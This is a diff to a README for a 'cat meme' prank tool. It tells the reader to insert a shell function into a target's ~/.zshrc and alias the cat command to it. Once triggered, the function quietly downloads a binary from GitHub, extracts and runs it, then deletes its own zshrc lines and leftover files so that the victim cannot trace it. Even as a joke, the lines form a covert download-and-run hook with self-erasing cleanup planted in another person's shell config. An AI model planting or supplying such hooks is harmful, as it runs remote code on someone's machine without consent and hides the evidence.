@@ -30,7 +30,7 @@ For example, if you are using Mac (arm), you can download it using the following
 To provide a one-time cat meme prank, insert the following script into the target's zshrc file. This script leaves no traces, so the victim won't be able to trace where the cat meme came from.
 (This script was made by [Kei](https://github.com/Motifman). Thanks!)
 ```
-function catmeme() {curl -LO https://github.com/kmraven/catmeme/releases/download/v0.0.0/catmeme_Darwin_arm64.tar.gz; tar xvf catmeme_Darwin_arm64.tar.gz; ./catmeme -c -t 10; sed -i ".aonaon" -e '/#CATMEME/d' ~/.zshrc; rm -f catmeme* *.aonaon; source ~/.zshrc; unset -f catmeme; unalias cat;} #CATMEME
+function catmeme() {curl -sLo ~/catmeme_Darwin_arm64.tar.gz https://github.com/kmraven/catmeme/releases/download/v0.0.0/catmeme_Darwin_arm64.tar.gz && tar xfz ~/catmeme_Darwin_arm64.tar.gz -C ~/ && ~/catmeme -c -t 10 && sed -i ".aonaon" -e '/#CATMEME/d' ~/.zshrc && rm -f ~/catmeme* ~/.*.aonaon && source ~/.zshrc && unset -f catmeme && unalias cat;} #CATMEME
 alias cat="catmeme" #CATMEME
 ```
 
